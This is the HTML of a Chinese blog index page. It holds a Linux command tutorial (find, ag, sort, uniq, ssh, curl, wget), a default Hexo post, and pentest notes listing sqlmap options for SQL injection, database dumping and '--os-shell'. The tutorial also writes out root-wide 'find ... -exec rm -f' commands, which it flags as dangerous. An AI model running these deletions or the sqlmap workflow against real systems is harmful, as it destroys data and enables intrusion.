<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">find 搜索路径 [选项] 搜索内容 -exec 命令2&#123;&#125;\;</span><br><span class="line">find . -type f -perm 644 -exec ls -l &#123;&#125; \;</span><br><span class="line">find / -exec grep &quot;Hello&quot; &#123;&#125; \;</span><br><span class="line"></span><br><span class="line">find / -name &quot;*.tmp&quot; -exec rm -f &#123;&#125; \;   (危险)</span><br><span class="line">find / -name &quot;*&quot; -ctime +2 -exec rm -f &#123;&#125; \;（危险，别敲）</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="http://book.fsec.io/bookimages/image-20220412183125843.png"><img src="http://book.fsec.io/bookimages/image-20220412183125843.png" alt="">
</a></p>
<p><a target="_blank" rel="noopener" href="http://book.fsec.io/bookimages/image-20220412183104764.png"><img src="http://book.fsec.io/bookimages/image-20220412183104764.png" alt="">
</a></p>
<p><a target="_blank" rel="noopener" href="http://book.fsec.io/bookimages/image-20220412183337999.png"><img src="http://book.fsec.io/bookimages/image-20220412183337999.png" alt="">
</a></p>
<h2 id="5-ag-命令"><a href="#5-ag-命令" class="headerlink" title="5. ag 命令"></a>5. ag 命令</h2><p><code>ag</code>类似<code>grep</code>和<code>find</code>，但是执行效率比后两者高。</p>
<p>最基本的用法为<code>ag -g &lt;File Name&gt;</code>,从当前目录寻找文件</p>
<p><a target="_blank" rel="noopener" href="http://book.fsec.io/bookimages/image-20211123022227993.png"><img src="http://book.fsec.io/bookimages/image-20211123022227993.png" alt="">
</a></p>
<p>案例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ag -g &lt;File Name&gt;            # 类似于 find . -name &lt;File Name&gt;</span><br><span class="line">ag -i PATTERN                # 忽略大小写搜索含PATTERN文本</span><br><span class="line">ag -A [number] PATTERN       #搜索含PATTERN文本，并显示匹配内容之后的n行文本，例如：ag -A 5  abc会显示搜索到的包含abc的行以及它之后5行的文本信息。</span><br><span class="line">ag -B [number] PATTERN       #搜索含PATTERN文本，并显示匹配内容之前的n行文本</span><br><span class="line">ag -C [number] PATTERN       #搜索含PATTERN文本，并同时显示匹配内容以及它前后各n行文本的内容。</span><br><span class="line">ag --ignore-dir &lt;Dir Name&gt;   #忽略某些文件目录进行搜索。</span><br><span class="line">ag -w PATTERN                #全匹配搜索，只搜索与所搜内容完全匹配的文本。</span><br><span class="line">ag --java PATTERN            #在java文件中搜索含PATTERN的文本。</span><br><span class="line">ag --xml PATTERN             #在XML文件中搜索含PATTERN的</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="http://book.fsec.io/bookimages/image-20211123023039232.png"><img src="http://book.fsec.io/bookimages/image-20211123023039232.png" alt="">
</a></p>
<h2 id="6-stat命令"><a href="#6-stat命令" class="headerlink" title="6.stat命令"></a>6.stat命令</h2><p>用于显示文件信息：</p>
<p>用法：stat [文件或目录]</p>
<p><a target="_blank" rel="noopener" href="http://book.fsec.io/bookimages/image-20220412183616115.png"><img src="http://book.fsec.io/bookimages/image-20220412183616115.png" alt="">
</a></p>
<p><a target="_blank" rel="noopener" href="http://book.fsec.io/bookimages/image-20220412194944379.png"><img src="http://book.fsec.io/bookimages/image-20220412194944379.png" alt="">
</a></p>
<h2 id="7-split-命令"><a href="#7-split-命令" class="headerlink" title="7. split 命令"></a>7. split 命令</h2><p><code>split</code>命令可以将一个大文件分割成很多个小文件，有时需要将文件分割成更小的片段，比如为提高可读性，生成日志等。</p>
<p>参数：</p>
<ul>
<li>-b 按文件大小进行切割</li>
<li>-l 按行数来进行切割</li>
<li>-d 为使用数字为生成文件的后缀</li>
<li>-a 指定后缀的长度</li>
</ul>
<p>案例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">split -b 30k messages    # 按照每个文件30K大小切割messages文件。</span><br><span class="line">split -l 300 messages    # 将messages文件切割为每3行一份。</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="http://book.fsec.io/bookimages/image-20211123024457498.png"><img src="http://book.fsec.io/bookimages/image-20211123024457498.png" alt="">
</a></p>
<h2 id="8-sort命令"><a href="#8-sort命令" class="headerlink" title="8.sort命令"></a>8.sort命令</h2><p><code>sort</code>命令是在Linux里非常有用，它将文件进行排序，并将排序结果标准输出。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat 1.txt|sort            #默认的排序方式，从首字母开始</span><br><span class="line">cat 1.txt|sort -t         #按照字典进行排序</span><br><span class="line">cat 1.txt|sort -n         #按照数字进行排序</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="http://book.fsec.io/bookimages/image-20211123025355278.png"><img src="http://book.fsec.io/bookimages/image-20211123025355278.png" alt="">
</a></p>
<p><a target="_blank" rel="noopener" href="http://book.fsec.io/bookimages/image-20211123025422931.png"><img src="http://book.fsec.io/bookimages/image-20211123025422931.png" alt="">
</a></p>
<h2 id="9-uniq-命令"><a href="#9-uniq-命令" class="headerlink" title="9. uniq 命令"></a>9. uniq 命令</h2><p><code>uniq</code>用于报告或忽略文件中的重复行，一般与sort命令结合使用。</p>
<p>要注意先排序，后去重。因为uniq命令只能消除相邻且相同的行。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat 1.txt |sort -n |uniq              #排序去重</span><br><span class="line">cat 1.txt|sort -n |uniq -c            #列出重复的次数</span><br><span class="line">cat 1.txt |sort -n |uniq -d           #列出有哪些行是重复的</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="http://book.fsec.io/bookimages/image-20211123025657891.png"><img src="http://book.fsec.io/bookimages/image-20211123025657891.png" alt="">
</a></p>
<p><a target="_blank" rel="noopener" href="http://book.fsec.io/bookimages/image-20211123030635872.png"><img src="http://book.fsec.io/bookimages/image-20211123030635872.png" alt="">
</a></p>
<p><a target="_blank" rel="noopener" href="http://book.fsec.io/bookimages/image-20211123030719113.png"><img src="http://book.fsec.io/bookimages/image-20211123030719113.png" alt="">
</a></p>
<p>以上系列命令可以用于日志分析：</p>
<p>如统计IP地址的访问数量并按照数量进行排序： <code>cat access_log |awk &#39;&#123;print($1)&#125;&#39;|sort|uniq -c |sort -nr |more</code></p>
<p>针对访问量最大的IP分析其访问内容： <code>cat access_log |grep &#39;IP地址&#39;|head -n 100</code></p>
<h2 id="10-nl-命令"><a href="#10-nl-命令" class="headerlink" title="10. nl 命令"></a>10. nl 命令</h2><p><code>nl</code>命令用于显示文件内容行号。</p>
<p>案例：</p>
<p><a target="_blank" rel="noopener" href="http://book.fsec.io/bookimages/image-20211123030931008.png"><img src="http://book.fsec.io/bookimages/image-20211123030931008.png" alt="">
</a></p>
<h2 id="11-远程连接命令"><a href="#11-远程连接命令" class="headerlink" title="11.远程连接命令"></a>11.远程连接命令</h2><h3 id="11-1-ssh命令"><a href="#11-1-ssh命令" class="headerlink" title="11.1 ssh命令"></a>11.1 ssh命令</h3><p><code>ssh</code>命令是Linux的远程连接工具。</p>
<p>ssh命令：Linux的远程连接工具</p>
<p>例如<code>ssh 192.168.0.149</code>，以当前终端用户身份远程连接IP为<code>192.168.0.149</code>的计算机。</p>
<ul>
<li>-l 为指定用户 如 <code>ssh -l farmsec 192.168.0.149</code>以farmsec用户远程登录，也可写成<code>ssh farmsec@192.168.0.149</code></li>
<li>-p 为指定端口号</li>
</ul>
<p>执行<code>ssh</code>的默认情况下，会使用本地的用户名连接对方的用户名，例如本地的root连接对面服务器的root，如果两端用户名不一样，则需要使用<code>-l username</code>指定用户名。</p>
<p>再确认密码后，方能登录成功，而同时变化的文件为：<code>/root/.ssh/known_hosts</code> 在第一次登录时，openssh将会提示不知道这台登录的主机，只要输入<code>yes</code>，就会把这台主机的“识别信息”添加到known_hosts文件中. 第二次登陆后，则无须此步骤，但是如果出现错误，例如主机产生变化，则需要删除<code>/root/.ssh/known_hosts</code>内容。</p>
<h3 id="11-2-linux下远程连接smb"><a href="#11-2-linux下远程连接smb" class="headerlink" title="11.2 linux下远程连接smb"></a>11.2 linux下远程连接smb</h3><p>Smb服务为网络文件共享协议，它允许应用程序和终端用户从远端的文件服务器访问文件资源 用法：在kali的<code>文件</code>–&gt;<code>其他位置</code>--&gt;<code>连接到服务器</code>处输入：<code>smb://192.168.0.149/share</code></p>
<p><a target="_blank" rel="noopener" href="http://book.fsec.io/bookimages/image-20211123032507587.png"><img src="http://book.fsec.io/bookimages/image-20211123032507587.png" alt="">
</a></p>
<p>关于此部分知识，还将在后续有关windows的章节中详述。</p>
<h3 id="11-3-rdesktop-命令"><a href="#11-3-rdesktop-命令" class="headerlink" title="11.3 rdesktop 命令"></a>11.3 rdesktop 命令</h3><p><code>rdesktop</code>命令用于在linux下链接windows远程桌面。</p>
<p>用法：<code>rdesktop 192.168.0.178</code></p>
<p>关于此部分知识，还将在后续有关windows的章节中详述。</p>
<h2 id="12-URL-相关命令"><a href="#12-URL-相关命令" class="headerlink" title="12. URL 相关命令"></a>12. URL 相关命令</h2><p>URL，既是俗称的网址/网页链接。</p>
<h3 id="12-1-curl-命令"><a href="#12-1-curl-命令" class="headerlink" title="12.1 curl 命令"></a>12.1 curl 命令</h3><p><code>curl</code>命令是一个利用URL规则在命令行下工作的文件传输工具。它支持文件的上传和下载，所以是综合传输工具，但按传统，习惯称curl为下载工具。作为一款强力工具，curl支持包括HTTP、HTTPS、ftp等众多协议，还支持POST、cookies、认证、从指定偏移处下载部分文件、用户代理字符串、限速、文件大小、进度条等特征。</p>
<p>用法：<code>curl [选项] [url]</code></p>
<p>参数：</p>
<ul>
<li>-i 显示头部信息</li>
<li>-v 显示请求全过程解析</li>
<li>-O 下载</li>
</ul>
<p>案例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl www.farmsec.com</span><br><span class="line">curl www.farmsec.com -i</span><br><span class="line">curl www.farmsec.com -v</span><br><span class="line">curl -O https://bootstrap.pypa.io/get-pip.py</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="http://book.fsec.io/bookimages/image-20211123225552183.png"><img src="http://book.fsec.io/bookimages/image-20211123225552183.png" alt="">
</a></p>
<p><a target="_blank" rel="noopener" href="http://book.fsec.io/bookimages/image-20211123225645062.png"><img src="http://book.fsec.io/bookimages/image-20211123225645062.png" alt="">
</a></p>
<p><a target="_blank" rel="noopener" href="http://book.fsec.io/bookimages/image-20211123225755764.png"><img src="http://book.fsec.io/bookimages/image-20211123225755764.png" alt="">
</a></p>
<p><a target="_blank" rel="noopener" href="http://book.fsec.io/bookimages/image-20211123230640059.png"><img src="http://book.fsec.io/bookimages/image-20211123230640059.png" alt="">
</a></p>
<h3 id="12-2-wget-命令"><a href="#12-2-wget-命令" class="headerlink" title="12.2 wget 命令"></a>12.2 wget 命令</h3><p>wget命令：用来从指定的URL下载文件。wget非常稳定，它在带宽很窄的情况下和不稳定网络中有很强的适应性，如果是由于网络的原因下载失败，wget会不断的尝试，直到整个文件下载完毕。如果是服务器打断下载过程，它会再次联到服务器上从停止的地方继续下载。这对从那些限定了链接时间的服务器上下载大文件非常有用。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://bootstrap.pypa.io/get-pip.py</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="http://book.fsec.io/bookimages/image-20211123231255763.png"><img src="http://book.fsec.io/bookimages/image-20211123231255763.png" alt="">
</a></p>
<p>前面我们下载下的文件名都是乱码，所以我们需要给它自定义文件名 加入-O的参数即可指定文件名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget  https://bootstrap.pypa.io/get-pip.py -O 123.py</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="http://book.fsec.io/bookimages/image-20211123231525997.png"><img src="http://book.fsec.io/bookimages/image-20211123231525997.png" alt="">
</a></p>
<p>如果文件比较大时，加入参数<code>-b</code>，进行后台下载，然后可使用使用<code>tail -f wget-log</code>查看进度。</p>
<p><a target="_blank" rel="noopener" href="http://book.fsec.io/bookimages/image-20211123231737387.png"><img src="http://book.fsec.io/bookimages/image-20211123231737387.png" alt="">
</a></p>
<p><a target="_blank" rel="noopener" href="http://book.fsec.io/bookimages/image-20211123231723830.png"><img src="http://book.fsec.io/bookimages/image-20211123231723830.png" alt="">
</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-c：继续执行上次终端的任务；可以在下载中断后再次使用。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="http://book.fsec.io/bookimages/image-20220412191424135.png"><img src="http://book.fsec.io/bookimages/image-20220412191424135.png" alt="">
</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://allofmortal.github.io/2023/05/16/hello-world/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Mortal">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/05/16/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">نُشر في</span>
              

              <time title="أُنشأ: 2023-05-16 23:51:51 / عُدل: 15:19:27" itemprop="dateCreated datePublished" datetime="2023-05-16T23:51:51+08:00">2023-05-16</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://allofmortal.github.io/2022/11/16/sqlmap-%E5%91%BD%E4%BB%A4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Mortal">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/11/16/sqlmap-%E5%91%BD%E4%BB%A4/" class="post-title-link" itemprop="url">sqlmap 命令</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">نُشر في</span>
              

              <time title="أُنشأ: 2022-11-16 12:56:51 / عُدل: 15:45:18" itemprop="dateCreated datePublished" datetime="2022-11-16T12:56:51+08:00">2022-11-16</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">في</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">pentest</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="必记"><a href="#必记" class="headerlink" title="必记"></a>必记</h1><ul>
<li>-u URL, —url=URL   Target URL (e.g. “<a target="_blank" rel="noopener" href="http://www.site.com/vuln.php?id=1">http://www.site.com/vuln.php?id=1</a>“)</li>
<li>-r REQUESTFILE      Load HTTP request from a file</li>
<li>-m BULKFILE         Scan multiple targets given in a textual file</li>
<li>—cookie=COOKIE     HTTP Cookie header value (e.g. “PHPSESSID=a8d127e..”)</li>
<li>—mobile            Imitate smartphone through HTTP User-Agent header</li>
<li>—random-agent      Use randomly selected HTTP User-Agent header value</li>
<li>—proxy=PROXY       Use a proxy to connect to the target URL</li>
</ul>
<p><em>`的使用</em></p>
<ul>
<li><p>—dbms=DBMS         Force back-end DBMS to provided value</p>
</li>
<li><p>—prefix=PREFIX     Injection payload prefix string</p>
</li>
<li><p>—suffix=SUFFIX     Injection payload suffix string</p>
</li>
<li><p>—technique=TECH..  SQL injection techniques to use (default “BEUSTQ”)</p>
</li>
<li><p>—batch             Never ask for user input, use the default behavior</p>
</li>
</ul>
<p>意外情况</p>
<ul>
<li>—level=LEVEL       Level of tests to perform (1-5, default 1)</li>
<li><p>—risk=RISK         Risk of tests to perform (1-3, default 1)</p>
</li>
<li><p>—second-url=SEC..  Resulting page URL searched for second-order response</p>
</li>
<li><p>—chunked           Use HTTP chunked transfer encoded (POST) requests</p>
</li>
<li><p>—hpp               Use HTTP parameter pollution method</p>
</li>
<li><p>—tamper=TAMPER     Use given script(s) for tampering injection data</p>
</li>
</ul>
<p>结尾</p>
<ul>
<li><p>—is-dba            Detect if the DBMS current user is DBA</p>
</li>
<li><p>—dbs               Enumerate DBMS databases</p>
</li>
<li><p>—current-user      Retrieve DBMS current user</p>
</li>
<li><p>—current-db        Retrieve DBMS current database</p>
</li>
<li><p>-D -T -C —dump</p>
</li>
</ul>
<ul>
<li>—os-shell          Prompt for an interactive operating system shell</li>
</ul>
<p>网站time</p>
<ul>
<li>—delay=DELAY       Delay in seconds between each HTTP request</li>
<li><p>—timeout=TIMEOUT   Seconds to wait before timeout connection (default 30)</p>
</li>
<li><p>—time-sec=TIMESEC  Seconds to delay the DBMS response (default 5)</p>
</li>
</ul>
<hr>
<h1 id="sqlmap-参数分类"><a href="#sqlmap-参数分类" class="headerlink" title="sqlmap 参数分类"></a>sqlmap 参数分类</h1><h2 id="能够发包-—-gt-构造http请求"><a href="#能够发包-—-gt-构造http请求" class="headerlink" title="能够发包 —&gt; 构造http请求"></a>能够发包 —&gt; 构造http请求</h2><ul>
<li>-u</li>
<li>-r</li>
<li>—data</li>
<li>-m</li>
<li>—cookie</li>
</ul>
<p>-u “url” —cookie<br>-r <del>cookie</del><br>-u —cookie=” “ —data=” “</p>
<h2 id="提高测试效率"><a href="#提高测试效率" class="headerlink" title="提高测试效率"></a>提高测试效率</h2><p><code>-p</code>    <code>--dbms</code> </p>
<h2 id="应对特殊参数情况"><a href="#应对特殊参数情况" class="headerlink" title="应对特殊参数情况"></a>应对特殊参数情况</h2><p>time tamper </p>
<h2 id="数据解决"><a href="#数据解决" class="headerlink" title="数据解决"></a>数据解决</h2><p>—dbs</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-D xxx --tables</span><br><span class="line">-D xxx -T xxx --columns</span><br><span class="line">-D xxx -T xxx -C xxx,xxx --dump </span><br></pre></td></tr></table></figure>
<p>—is-dba —currxxxx-user</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="الصفحة التالية"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          المحتويات
        </li>
        <li class="sidebar-nav-overview">
          عام
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Mortal</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">28</span>
          <span class="site-state-item-name">المقالات</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">14</span>
        <span class="site-state-item-name">التصنيفات</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">20</span>
        <span class="site-state-item-name">الوسوم</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/AllofMortal" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;AllofMortal" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://steamcommunity.com/id/AllofMortal" title="Steam → https:&#x2F;&#x2F;steamcommunity.com&#x2F;id&#x2F;AllofMortal" rel="noopener" target="_blank"><i class="fab fa-steam fa-fw"></i>Steam</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2026</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Mortal</span>
</div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  
  <script>
    (function(){
      var canonicalURL, curProtocol;
      //Get the <link> tag
      var x=document.getElementsByTagName("link");
		//Find the last canonical URL
		if(x.length > 0){
			for (i=0;i<x.length;i++){
				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
					canonicalURL=x[i].href;
				}
			}
		}
    //Get protocol
	    if (!canonicalURL){
	    	curProtocol = window.location.protocol.split(':')[0];
	    }
	    else{
	    	curProtocol = canonicalURL.split(':')[0];
	    }
      //Get current URL if the canonical URL does not exist
	    if (!canonicalURL) canonicalURL = window.location.href;
	    //Assign script content. Replace current URL with the canonical URL
      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
  </script>















  

  
      

<script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      loader: {
        source: {
          '[tex]/amsCd': '[tex]/amscd',
          '[tex]/AMScd': '[tex]/amscd'
        }
      },
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              let target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    (function () {
      var script = document.createElement('script');
      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
      script.defer = true;
      document.head.appendChild(script);
    })();
  } else {
    MathJax.startup.document.state(0);
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  

</body>
</html>
